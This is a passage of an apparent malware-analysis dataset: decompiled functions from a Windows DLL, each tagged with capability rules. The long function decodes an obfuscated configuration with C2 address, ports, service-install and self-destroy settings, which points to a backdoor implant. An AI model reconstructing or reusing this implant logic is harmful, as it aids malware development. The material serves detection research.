uStack1090;\n    uchar uStack1089;\n    uchar uStack1088;\n    uchar uStack1087;\n    uchar uStack1086;\n    uchar uStack1085;\n    uchar uStack1080;\n    uchar uStack1079;\n    uchar uStack1078;\n    uchar uStack1077;\n    uchar uStack1076;\n    uchar uStack1075;\n    uchar uStack1074;\n    uchar uStack1072;\n    uchar uStack1071;\n    uchar uStack1070;\n    uchar uStack1069;\n    uchar uStack1068;\n    uchar uStack1067;\n    uchar uStack1066;\n    uchar auStack1064 [40];\n    uchar *puStack1024;\n    uchar auStack1016 [40];\n    uchar *puStack976;\n    uchar auStack968 [40];\n    uchar *puStack928;\n    uchar auStack920 [40];\n    uchar *puStack880;\n    uchar auStack872 [40];\n    uchar *puStack832;\n    uchar auStack824 [40];\n    uchar *puStack784;\n    uchar auStack776 [40];\n    uchar *puStack736;\n    uchar auStack728 [40];\n    uchar *puStack688;\n    uchar auStack680 [40];\n    uchar *puStack640;\n    uchar auStack632 [40];\n    uchar *puStack592;\n    uchar auStack584 [40];\n    uchar *puStack544;\n    uchar auStack536 [40];\n    uchar *puStack496;\n    uchar auStack488 [40];\n    uchar *puStack448;\n    uchar uStack440;\n    uchar uStack439;\n    ulong uStack432;\n    ulong uStack424;\n    int64_t *piStack416;\n    ulong uStack408;\n    ulong uStack400;\n    ulong uStack392;\n    int64_t *piStack384;\n    ulong uStack376;\n    ulong uStack368;\n    ulong uStack360;\n    int64_t *piStack352;\n    ulong uStack344;\n    ulong uStack336;\n    ulong uStack328;\n    int64_t *piStack320;\n    ulong uStack312;\n    ulong uStack304;\n    ulong uStack296;\n    int64_t *piStack288;\n    ulong uStack280;\n    ulong uStack272;\n    ulong uStack264;\n    int64_t *piStack256;\n    ulong uStack248;\n    ulong uStack240;\n    ulong uStack232;\n    int64_t *piStack224;\n    ulong uStack216;\n    ulong uStack208;\n    ulong uStack200;\n    int64_t *piStack192;\n    ulong uStack184;\n    ulong uStack176;\n    ulong uStack168;\n    int64_t *piStack160;\n    ulong uStack152;\n    ulong uStack144;\n    ulong uStack136;\n    int64_t *piStack128;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    int64_t *piStack96;\n    ulong uStack88;\n    ulong uStack80;\n    ulong uStack72;\n    int64_t *piStack64;\n    ulong uStack56;\n    char *pcStack48;\n    char *pcStack40;\n    uint64_t uStack32;\n    \n    uStack432 = 0xfffffffffffffffe;\n    uStack32 = *0x180040248 ^ auStack2040;\n    fcn.180011750(auStack1416);\n    fcn.18000e3d0(auStack1472);\n    fcn.18000e3d0(auStack1520);\n    arg2 = fcn.1800033a0(arg1);\n    fcn.180013940(auStack1416, arg2, 0, 0);\n    cVar3 = fcn.1800107e0(auStack1416);\n    if ((cVar3 == '\\0') && (iStack1480 = fcn.1800101b0(auStack1416),  iStack1480 != 0)) {\n        uVar5 = fcn.180010120(iStack1480);\n        fcn.18000e4a0(auStack1472, uVar5);\n        cStack1432 = 'C';\n        uStack1431 = 0x4f;\n        uStack1430 = 0x4e;\n        uStack1429 = 0x46;\n        uStack1428 = 0x49;\n        uStack1427 = 0x47;\n        uStack1426 = 0;\n        uVar5 = fcn.1800033a0(auStack1472);\n        arg2 = &cStack1432;\n        iVar4 = fcn.180024374(uVar5, arg2);\n        if (iVar4 == 0) {\n            uStack1304 = 0x46;\n            uStack1303 = 0x4c;\n            uStack1302 = 0x41;\n            uStack1301 = 0x47;\n            uStack1300 = 0;\n            uStack1296 = fcn.180011200(iStack1480, &uStack1304);\n            auStack1248[0] = 0x34;\n            auStack1248[1] = 0x65;\n            auStack1248[2] = 0x4a;\n            auStack1248[3] = 0x6f;\n            uStack1240 = 0x43;\n            uStack1238 = 0x71;\n            uStack1236 = 0x43;\n            uStack1234 = 0x4e;\n            uStack1232 = 0x77;\n            uStack1230 = 0x4e;\n            uStack1228 = 0x5a;\n            uStack1226 = 0x36;\n            uStack1224 = 0x34;\n            uStack1222 = 0x73;\n            uStack1220 = 0x43;\n            uStack1218 = 0;\n            puStack1024 = auStack1064;\n            uStack424 = fcn.18000b740(puStack1024, uStack1296);\n            fcn.18000e140(auStack1288, uStack424);\n            puVar6 = fcn.1800020d0(auStack1288);\n            puVar9 = 0x18004ad20;\n            for (iVar8 = 0x20; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar9 = *puVar6;\n                puVar6 = puVar6 + 1;\n                puVar9 = puVar9 + 1;\n            }\n            puVar7 = 0x18004ad20;\n            do {\n                uVar1 = *puVar7;\n                arg2 = uVar1;\n                if (uVar1 != *(puVar7 + &stack0xfffffffe7ffb4e00)) {\n                    uVar2 = uVar1 < *(puVar7 + &stack0xfffffffe7ffb4e00);\n                    iVar4 = (1 - uVar2) - (uVar2 != 0);\n                    goto code_r0x00018001a7b3;\n                }\n                puVar7 = puVar7 + 1;\n            } while (uVar1 != 0);\n            iVar4 = 0;\ncode_r0x00018001a7b3:\n            if (iVar4 != 0) {\n                fcn.180001ef0(auStack1288, arg2);\n                goto code_r0x00018001bac2;\n            }\n            fcn.180001ef0(auStack1288, arg2);\n        }\n        for (iStack1216 = fcn.1800101b0(iStack1480); iStack1216 != 0; iStack1216 = fcn.180010190(iStack1216)) {\n            uVar5 = fcn.180010120(iStack1216);\n            fcn.18000e4a0(auStack1472, uVar5);\n            uStack1208 = 0x42;\n            uStack1207 = 0x41;\n            uStack1206 = 0x53;\n            uStack1205 = 0x45;\n            uStack1204 = 0;\n            uVar5 = fcn.1800033a0(auStack1472);\n            iVar4 = fcn.180024374(uVar5, &uStack1208);\n            if (iVar4 == 0) {\n                for (iStack1192 = fcn.1800101b0(iStack1216); iStack1192 != 0; iStack1192 = fcn.180010190(iStack1192)) {\n                    uVar5 = fcn.180010120(iStack1192);\n                    fcn.18000e4a0(auStack1472, uVar5);\n                    uStack1184 = 0x49;\n                    uStack1183 = 0x70;\n                    uStack1182 = 0;\n                    uVar5 = fcn.1800033a0(auStack1472);\n                    iVar4 = fcn.180024374(uVar5, &uStack1184);\n                    if (iVar4 == 0) {\n                        piStack416 = fcn.180010170(iStack1192);\n                        uVar5 = (**(*piStack416 + 0x58))(piStack416);\n                        uVar5 = fcn.180010120(uVar5);\n                        fcn.18000e4a0(auStack1520, uVar5);\n                        iVar8 = fcn.1800020f0(auStack1520);\n                        if (iVar8 != 0) {\n                            uVar5 = fcn.1800033a0(auStack1520);\n                            iVar4 = fcn.180024374(uVar5, 0x180039234);\n                            if (iVar4 != 0) {\n                                puStack976 = auStack1016;\n                                uStack408 = fcn.18000f720(puStack976, auStack1520);\n                                uVar5 = fcn.18000e140(auStack2000, uStack408);\n                                uStack400 = uVar5;\n                                uStack392 = uVar5;\n                                fcn.18000b7b0(0x18004ad40, uVar5);\n                                fcn.180001ef0(auStack2000, uVar5);\n                                goto code_r0x00018001aa09;\n                            }\n                        }\n                        fcn.1800020b0(0x18004ad40);\n                    }\ncode_r0x00018001aa09:\n                    uStack1152 = 0x44;\n                    uStack1151 = 0x6e;\n                    uStack1150 = 0x73;\n                    uStack1149 = 0;\n                    uVar5 = fcn.1800033a0(auStack1472);\n                    iVar4 = fcn.180024374(uVar5, &uStack1152);\n                    if (iVar4 == 0) {\n                        piStack384 = fcn.180010170(iStack1192);\n                        uVar5 = (**(*piStack384 + 0x58))(piStack384);\n                        uVar5 = fcn.180010120(uVar5);\n                        fcn.18000e4a0(auStack1520, uVar5);\n                        iVar8 = fcn.1800020f0(auStack1520);\n                        if (iVar8 != 0) {\n                            uVar5 = fcn.1800033a0(auStack1520);\n                            iVar4 = fcn.180024374(uVar5, 0x18003923c);\n                            if (iVar4 != 0) {\n                                puStack928 = auStack968;\n                                uStack376 = fcn.18000f720(puStack928, auStack1520);\n                                uVar5 = fcn.18000e140(auStack1960, uStack376);\n                                uStack368 = uVar5;\n                                uStack360 = uVar5;\n                                fcn.18000b7b0(0x18004ad90, uVar5);\n                                fcn.180001ef0(auStack1960, uVar5);\n                                goto code_r0x00018001ab47;\n                            }\n                        }\n                        fcn.1800020b0(0x18004ad90);\n                    }\ncode_r0x00018001ab47:\n                    uStack1176 = 0x43;\n                    uStack1175 = 0x6e;\n                    uStack1174 = 0x74;\n                    uStack1173 = 0x50;\n                    uStack1172 = 0x6f;\n                    uStack1171 = 0x72;\n                    uStack1170 = 0x74;\n                    uStack1169 = 0;\n                    uVar5 = fcn.1800033a0(auStack1472);\n                    iVar4 = fcn.180024374(uVar5, &uStack1176);\n                    if (iVar4 == 0) {\n                        piStack352 = fcn.180010170(iStack1192);\n                        uVar5 = (**(*piStack352 + 0x58))(piStack352);\n                        uVar5 = fcn.180010120(uVar5);\n                        fcn.18000e4a0(auStack1520, uVar5);\n                        iVar8 = fcn.1800020f0(auStack1520);\n                        if (iVar8 != 0) {\n                            uVar5 = fcn.1800033a0(auStack1520);\n                            iVar4 = fcn.180024374(uVar5, 0x180039244);\n                            if (iVar4 != 0) {\n                                puStack880 = auStack920;\n                                uStack344 = fcn.18000f720(puStack880, auStack1520);\n                                uVar5 = fcn.18000e140(auStack1920, uStack344);\n                                uStack336 = uVar5;\n                                uStack328 = uVar5;\n                                fcn.18000b7b0(0x18004ad68, uVar5);\n                                fcn.180001ef0(auStack1920, uVar5);\n                                goto code_r0x00018001aca5;\n                            }\n                        }\n                        fcn.1800020b0(0x18004ad68);\n                    }\ncode_r0x00018001aca5:\n                    uStack1160 = 0x4c;\n                    uStack1159 = 0x73;\n                    uStack1158 = 0x74;\n                    uStack1157 = 0x50;\n                    uStack1156 = 0x6f;\n                    uStack1155 = 0x72;\n                    uStack1154 = 0x74;\n                    uStack1153 = 0;\n                    uVar5 = fcn.1800033a0(auStack1472);\n                    iVar4 = fcn.180024374(uVar5, &uStack1160);\n                    if (iVar4 == 0) {\n                        piStack320 = fcn.180010170(iStack1192);\n                        uVar5 = (**(*piStack320 + 0x58))(piStack320);\n                        uVar5 = fcn.180010120(uVar5);\n                        fcn.18000e4a0(auStack1520, uVar5);\n                        iVar8 = fcn.1800020f0(auStack1520);\n                        if (iVar8 != 0) {\n                            uVar5 = fcn.1800033a0(auStack1520);\n                            iVar4 = fcn.180024374(uVar5, 0x18003924c);\n                            if (iVar4 != 0) {\n                                puStack832 = auStack872;\n                                uStack312 = fcn.18000f720(puStack832, auStack1520);\n                                uVar5 = fcn.18000e140(auStack1880, uStack312);\n                                uStack304 = uVar5;\n                                uStack296 = uVar5;\n                                fcn.18000b7b0(0x18004adb8, uVar5);\n                                fcn.180001ef0(auStack1880, uVar5);\n                                goto code_r0x00018001ae09;\n                            }\n                        }\n                        fcn.1800020b0(0x18004adb8);\n                    }\ncode_r0x00018001ae09:\n                    uStack1168 = 0x42;\n                    uStack1167 = 0x6c;\n                    uStack1166 = 0x6f;\n                    uStack1165 = 0x67;\n                    uStack1164 = 0;\n                    uVar5 = fcn.1800033a0(auStack1472);\n                    iVar4 = fcn.180024374(uVar5, &uStack1168);\n                    if (iVar4 == 0) {\n                        piStack288 = fcn.180010170(iStack1192);\n                        uVar5 = (**(*piStack288 + 0x58))(piStack288);\n                        uVar5 = fcn.180010120(uVar5);\n                        fcn.18000e4a0(auStack1520, uVar5);\n                        iVar8 = fcn.1800020f0(auStack1520);\n                        if (iVar8 != 0) {\n                            uVar5 = fcn.1800033a0(auStack1520);\n                            iVar4 = fcn.180024374(uVar5, 0x180039254);\n                            if (iVar4 != 0) {\n                                puStack784 = auStack824;\n                                uStack280 = fcn.18000f720(puStack784, auStack1520);\n                                uVar5 = fcn.18000e140(auStack1840, uStack280);\n                                uStack272 = uVar5;\n                                uStack264 = uVar5;\n                                fcn.18000b7b0(0x18004ade0, uVar5);\n                                fcn.180001ef0(auStack1840, uVar5);\n                                goto code_r0x00018001a892;\n                            }\n                        }\n                        fcn.1800020b0(0x18004ade0);\n                    }\ncode_r0x00018001a892:\n                }\n            }\n            uStack1196 = 0x53;\n            uStack1195 = 0x56;\n            uStack1194 = 0x43;\n            uStack1193 = 0;\n            uVar5 = fcn.1800033a0(auStack1472);\n            iVar4 = fcn.180024374(uVar5, &uStack1196);\n            if (iVar4 == 0) {\n                for (iStack1144 = fcn.1800101b0(iStack1216); iStack1144 != 0; iStack1144 = fcn.180010190(iStack1144)) {\n                    uVar5 = fcn.180010120(iStack1144);\n                    fcn.18000e4a0(auStack1472, uVar5);\n                    uStack1128 = 0x53;\n                    uStack1127 = 0x76;\n                    uStack1126 = 99;\n                    uStack1125 = 0x4e;\n                    uStack1124 = 0x61;\n                    uStack1123 = 0x6d;\n                    uStack1122 = 0x65;\n                    uStack1121 = 0;\n                    uVar5 = fcn.1800033a0(auStack1472);\n                    iVar4 = fcn.180024374(uVar5, &uStack1128);\n                    if (iVar4 == 0) {\n                        piStack256 = fcn.180010170(iStack1144);\n                        uVar5 = (**(*piStack256 + 0x58))(piStack256);\n                        uVar5 = fcn.180010120(uVar5);\n                        fcn.18000e4a0(auStack1520, uVar5);\n                        iVar8 = fcn.1800020f0(auStack1520);\n                        if (iVar8 != 0) {\n                            uVar5 = fcn.1800033a0(auStack1520);\n                            iVar4 = fcn.180024374(uVar5, 0x18003925c);\n                            if (iVar4 != 0) {\n                                puStack736 = auStack776;\n                                uStack248 = fcn.18000f720(puStack736, auStack1520);\n                                uVar5 = fcn.18000e140(auStack1800, uStack248);\n                                uStack240 = uVar5;\n                                uStack232 = uVar5;\n                                fcn.18000b7b0(0x18004ae08, uVar5);\n                                fcn.180001ef0(auStack1800, uVar5);\n                                goto code_r0x00018001b15b;\n                            }\n                        }\n                        fcn.1800020b0(0x18004ae08);\n                    }\ncode_r0x00018001b15b:\n                    uStack1120 = 0x53;\n                    uStack1119 = 0x76;\n                    uStack1118 = 99;\n                    uStack1117 = 0x44;\n                    uStack1116 = 0x69;\n                    uStack1115 = 0x73;\n                    uStack1114 = 0x70;\n                    uStack1113 = 0;\n                    uVar5 = fcn.1800033a0(auStack1472);\n                    iVar4 = fcn.180024374(uVar5, &uStack1120);\n                    if (iVar4 == 0) {\n                        piStack224 = fcn.180010170(iStack1144);\n                        uVar5 = (**(*piStack224 + 0x58))(piStack224);\n                        uVar5 = fcn.180010120(uVar5);\n                        fcn.18000e4a0(auStack1520, uVar5);\n                        iVar8 = fcn.1800020f0(auStack1520);\n                        if (iVar8 != 0) {\n                            uVar5 = fcn.1800033a0(auStack1520);\n                            iVar4 = fcn.180024374(uVar5, 0x180039264);\n                            if (iVar4 != 0) {\n                                puStack688 = auStack728;\n                                uStack216 = fcn.18000f720(puStack688, auStack1520);\n                                uVar5 = fcn.18000e140(auStack1760, uStack216);\n                                uStack208 = uVar5;\n                                uStack200 = uVar5;\n                                fcn.18000b7b0(0x18004ae30, uVar5);\n                                fcn.180001ef0(auStack1760, uVar5);\n                                goto code_r0x00018001b2bf;\n                            }\n                        }\n                        fcn.1800020b0(0x18004ae30);\n                    }\ncode_r0x00018001b2bf:\n                    uStack1136 = 0x53;\n                    uStack1135 = 0x76;\n                    uStack1134 = 99;\n                    uStack1133 = 0x44;\n                    uStack1132 = 0x65;\n                    uStack1131 = 0x73;\n                    uStack1130 = 99;\n                    uStack1129 = 0;\n                    uVar5 = fcn.1800033a0(auStack1472);\n                    iVar4 = fcn.180024374(uVar5, &uStack1136);\n                    if (iVar4 == 0) {\n                        piStack192 = fcn.180010170(iStack1144);\n                        uVar5 = (**(*piStack192 + 0x58))(piStack192);\n                        uVar5 = fcn.180010120(uVar5);\n                        fcn.18000e4a0(auStack1520, uVar5);\n                        iVar8 = fcn.1800020f0(auStack1520);\n                        if (iVar8 != 0) {\n                            uVar5 = fcn.1800033a0(auStack1520);\n                            iVar4 = fcn.180024374(uVar5, 0x18003926c);\n                            if (iVar4 != 0) {\n                                puStack640 = auStack680;\n                                uStack184 = fcn.18000f720(puStack640, auStack1520);\n                                uVar5 = fcn.18000e140(auStack1720, uStack184);\n                                uStack176 = uVar5;\n                                uStack168 = uVar5;\n                                fcn.18000b7b0(0x18004ae58, uVar5);\n                                fcn.180001ef0(auStack1720, uVar5);\n                                goto code_r0x00018001b423;\n                            }\n                        }\n                        fcn.1800020b0(0x18004ae58);\n                    }\ncode_r0x00018001b423:\n                    uStack1112 = 0x53;\n                    uStack1111 = 0x76;\n                    uStack1110 = 99;\n                    uStack1109 = 0x44;\n                    uStack1108 = 0x6c;\n                    uStack1107 = 0x6c;\n                    uStack1106 = 0;\n                    uVar5 = fcn.1800033a0(auStack1472);\n                    iVar4 = fcn.180024374(uVar5, &uStack1112);\n                    if (iVar4 == 0) {\n                        piStack160 = fcn.180010170(iStack1144);\n                        uVar5 = (**(*piStack160 + 0x58))(piStack160);\n                        uVar5 = fcn.180010120(uVar5);\n                        fcn.18000e4a0(auStack1520, uVar5);\n                        iVar8 = fcn.1800020f0(auStack1520);\n                        if (iVar8 != 0) {\n                            uVar5 = fcn.1800033a0(auStack1520);\n                            iVar4 = fcn.180024374(uVar5, 0x180039274);\n                            if (iVar4 != 0) {\n                                puStack592 = auStack632;\n                                uStack152 = fcn.18000f720(puStack592, auStack1520);\n                                uVar5 = fcn.18000e140(auStack1680, uStack152);\n                                uStack144 = uVar5;\n                                uStack136 = uVar5;\n                                fcn.18000b7b0(0x18004ae80, uVar5);\n                                fcn.180001ef0(auStack1680, uVar5);\n                                goto code_r0x00018001afb6;\n                            }\n                        }\n                        fcn.1800020b0(0x18004ae80);\n                    }\ncode_r0x00018001afb6:\n                }\n            }\n            cStack1200 = 'A';\n            uStack1199 = 0x44;\n            uStack1198 = 0x56;\n            uStack1197 = 0;\n            uVar5 = fcn.1800033a0(auStack1472);\n            arg2 = &cStack1200;\n            iVar4 = fcn.180024374(uVar5, arg2);\n            if (iVar4 == 0) {\n                for (iStack1104 = fcn.1800101b0(iStack1216); iStack1104 != 0; iStack1104 = fcn.180010190(iStack1104)) {\n                    uVar5 = fcn.180010120(iStack1104);\n                    fcn.18000e4a0(auStack1472, uVar5);\n                    uStack1080 = 0x4f;\n                    uStack1079 = 0x6c;\n                    uStack1078 = 0x50;\n                    uStack1077 = 0x61;\n                    uStack1076 = 0x73;\n                    uStack1075 = 0x73;\n                    uStack1074 = 0;\n                    uVar5 = fcn.1800033a0(auStack1472);\n                    iVar4 = fcn.180024374(uVar5, &uStack1080);\n                    if (iVar4 == 0) {\n                        piStack128 = fcn.180010170(iStack1104);\n                        uVar5 = (**(*piStack128 + 0x58))(piStack128);\n                        uVar5 = fcn.180010120(uVar5);\n                        fcn.18000e4a0(auStack1520, uVar5);\n                        iVar8 = fcn.1800020f0(auStack1520);\n                        if (iVar8 != 0) {\n                            uVar5 = fcn.1800033a0(auStack1520);\n                            iVar4 = fcn.180024374(uVar5, 0x18003927c);\n                            if (iVar4 != 0) {\n                                puStack544 = auStack584;\n                                uStack120 = fcn.18000f720(puStack544, auStack1520);\n                                uVar5 = fcn.18000e140(auStack1640, uStack120);\n                                uStack112 = uVar5;\n                                uStack104 = uVar5;\n                                fcn.18000b7b0(0x18004aea8, uVar5);\n                                fcn.180001ef0(auStack1640, uVar5);\n                                goto code_r0x00018001b77d;\n                            }\n                        }\n                        fcn.1800020b0(0x18004aea8);\n                    }\ncode_r0x00018001b77d:\n                    uStack1072 = 0x4f;\n                    uStack1071 = 0x6c;\n                    uStack1070 = 0x54;\n                    uStack1069 = 0x69;\n                    uStack1068 = 0x6d;\n                    uStack1067 = 0x65;\n                    uStack1066 = 0;\n                    uVar5 = fcn.1800033a0(auStack1472);\n                    iVar4 = fcn.180024374(uVar5, &uStack1072);\n                    if (iVar4 == 0) {\n                        piStack96 = fcn.180010170(iStack1104);\n                        uVar5 = (**(*piStack96 + 0x58))(piStack96);\n                        uVar5 = fcn.180010120(uVar5);\n                        fcn.18000e4a0(auStack1520, uVar5);\n                        iVar8 = fcn.1800020f0(auStack1520);\n                        if (iVar8 != 0) {\n                            uVar5 = fcn.1800033a0(auStack1520);\n                            iVar4 = fcn.180024374(uVar5, 0x180039284);\n                            if (iVar4 != 0) {\n                                puStack496 = auStack536;\n                                uStack88 = fcn.18000f720(puStack496, auStack1520);\n                                uVar5 = fcn.18000e140(auStack1600, uStack88);\n                                uStack80 = uVar5;\n                                uStack72 = uVar5;\n                                fcn.18000b7b0(0x18004aed0, uVar5);\n                                fcn.180001ef0(auStack1600, uVar5);\n                                goto code_r0x00018001b8d9;\n                            }\n                        }\n                        fcn.1800020b0(0x18004aed0);\n                    }\ncode_r0x00018001b8d9:\n                    cStack1096 = 'S';\n                    uStack1095 = 0x65;\n                    uStack1094 = 0x6c;\n                    uStack1093 = 0x66;\n                    uStack1092 = 0x44;\n                    uStack1091 = 0x65;\n                    uStack1090 = 0x73;\n                    uStack1089 = 0x74;\n                    uStack1088 = 0x72;\n                    uStack1087 = 0x6f;\n                    uStack1086 = 0x79;\n                    uStack1085 = 0;\n                    uVar5 = fcn.1800033a0(auStack1472);\n                    arg2 = &cStack1096;\n                    iVar4 = fcn.180024374(uVar5, arg2);\n                    if (iVar4 == 0) {\n                        piStack64 = fcn.180010170(iStack1104);\n                        uVar5 = (**(*piStack64 + 0x58))(piStack64);\n                        arg2 = fcn.180010120(uVar5);\n                        fcn.18000e4a0(auStack1520, arg2);\n                        iVar8 = fcn.1800020f0(auStack1520);\n                        if (iVar8 != 0) {\n                            uVar5 = fcn.1800033a0(auStack1520);\n                            arg2 = \"NULL\";\n                            iVar4 = fcn.180024374(uVar5, \"NULL\");\n                            if (iVar4 != 0) {\n                                puStack448 = auStack488;\n                                uStack56 = fcn.18000f720(puStack448, auStack1520);\n                                arg2 = fcn.18000e140(auStack1560, uStack56);\n                                pcStack48 = arg2;\n                                pcStack40 = arg2;\n                                fcn.18000b7b0(0x18004aef8, arg2);\n                                fcn.180001ef0(auStack1560, arg2);\n                                goto code_r0x00018001b5e0;\n                            }\n                        }\n                        fcn.1800020b0(0x18004aef8);\n                    }\ncode_r0x00018001b5e0:\n                }\n            }\n        }\n        fcn.180010d40(auStack1416);\n        fcn.180017fc0();\n        uStack440 = 1;\n        fcn.180003370(auStack1520, arg2);\n        fcn.180003370(auStack1472, arg2);\n        fcn.1800107a0(auStack1416);\n        fcn.180003370(arg1, arg2);\n    }\n    else {\ncode_r0x00018001bac2:\n        fcn.180010d40(auStack1416);\n        uStack439 = 0;\n        fcn.180003370(auStack1520, arg2);\n        fcn.180003370(auStack1472, arg2);\n        fcn.1800107a0(auStack1416);\n        fcn.180003370(arg1, arg2);\n    }\n    fcn.180023980(uStack32 ^ auStack2040);\n    return;\n}\n",
        "token_count": 8720
    },
    "18001ca8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18001ca80(int64_t *arg1)\n\n{\n    if (*arg1 != 0) {\n        fcn.18000bcf0(arg1);\n        fcn.18001d0c0(arg1, *arg1, arg1[1]);\n        fcn.18000d120(arg1 + 3, *arg1, arg1[2] - *arg1 >> 2);\n    }\n    *arg1 = 0;\n    arg1[1] = 0;\n    arg1[2] = 0;\n    return;\n}\n",
        "token_count": 126
    },
    "18001cc2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18001cc20(int64_t *arg1)\n\n{\n    if (*arg1 != 0) {\n        fcn.18000bcf0(arg1);\n        fcn.18001d0c0(arg1, *arg1, arg1[1]);\n        fcn.18000d120(arg1 + 3, *arg1, arg1[2] - *arg1 >> 3);\n    }\n    *arg1 = 0;\n    arg1[1] = 0;\n    arg1[2] = 0;\n    return;\n}\n",
        "token_count": 126
    },
    "18001cee": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18001cee0(int64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t arg4;\n    int64_t iVar2;\n    \n    uVar1 = fcn.18001d0a0(arg1);\n    if (uVar1 < arg2) {\n        fcn.18000f030(arg1);\n    }\n    else {\n        uVar1 = fcn.18001d020(arg1);\n        if (uVar1 < arg2) {\n            arg4 = fcn.18001d570(arg1 + 3, arg2);\n            fcn.18001da40(arg1, *arg1, arg1[1], arg4);\n            iVar2 = fcn.18001d080(arg1);\n            if (*arg1 != 0) {\n                fcn.18001d0c0(arg1, *arg1, arg1[1]);\n                fcn.18000d120(arg1 + 3, *arg1, arg1[2] - *arg1 >> 2);\n            }\n            fcn.18000bcf0(arg1);\n            arg1[2] = arg4 + arg2 * 4;\n            arg1[1] = arg4 + iVar2 * 4;\n            *arg1 = arg4;\n        }\n    }\n    return;\n}\n",
        "token_count": 298
    },
    "18001d1b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18001d1b0(int64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t arg4;\n    int64_t iVar2;\n    \n    uVar1 = fcn.18001d310(arg1);\n    if (uVar1 < arg2) {\n        fcn.18000f030(arg1);\n    }\n    else {\n        uVar1 = fcn.18001d2f0(arg1);\n        if (uVar1 < arg2) {\n            arg4 = fcn.18001d5d0(arg1 + 3, arg2);\n            fcn.18001dad0(arg1, *arg1, arg1[1], arg4);\n            iVar2 = fcn.18001c5c0(arg1);\n            if (*arg1 != 0) {\n                fcn.18001d0c0(arg1, *arg1, arg1[1]);\n                fcn.18000d120(arg1 + 3, *arg1, arg1[2] - *arg1 >> 3);\n            }\n            fcn.18000bcf0(arg1);\n            arg1[2] = arg4 + arg2 * 8;\n            arg1[1] = arg4 + iVar2 * 8;\n            *arg1 = arg4;\n        }\n    }\n    return;\n}\n",
        "token_count": 304
    },
    "18001d50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18001d500(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    uchar auStackX32 [8];\n    \n    if (arg3 == 1) {\n        iVar1 = fcn.1800034b0(arg1);\n        fcn.180002f40(iVar1 + arg2, auStackX32);\n    }\n    else {\n        iVar1 = fcn.1800034b0(arg1);\n        fcn.180015c00(iVar1 + arg2, arg3);\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "18001d59": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00018001d5b9)\n\nulong fcn.18001d590(ulong arg1)\n\n{\n    return 0x3fffffffffffffff;\n}\n",
        "token_count": 44
    },
    "18001d5f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00018001d619)\n\nulong fcn.18001d5f0(ulong arg1)\n\n{\n    return 0x1fffffffffffffff;\n}\n",
        "token_count": 44
    },
    "18001db1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.18001db10(uint64_t arg1, ulong arg2)\n\n{\n    int64_t iStack40;\n    uchar auStack32 [32];\n    \n    iStack40 = 0;\n    if ((arg1 != 0) && ((0x3fffffffffffffff < arg1 || (iStack40 = fcn.180023ef8(arg1 << 2),  iStack40 == 0)))) {\n        fcn.180001220(auStack32, 0);\n        fcn.180025954(auStack32, 0x18003e970);\n    }\n    return iStack40;\n}\n",
        "token_count": 138
    },
    "18001db9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.18001db90(uint64_t arg1, ulong arg2)\n\n{\n    int64_t iStack40;\n    uchar auStack32 [32];\n    \n    iStack40 = 0;\n    if ((arg1 != 0) && ((0x1fffffffffffffff < arg1 || (iStack40 = fcn.180023ef8(arg1 << 3),  iStack40 == 0)))) {\n        fcn.180001220(auStack32, 0);\n        fcn.180025954(auStack32, 0x18003e970);\n    }\n    return iStack40;\n}\n",
        "token_count": 138
    },
    "18001dcd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
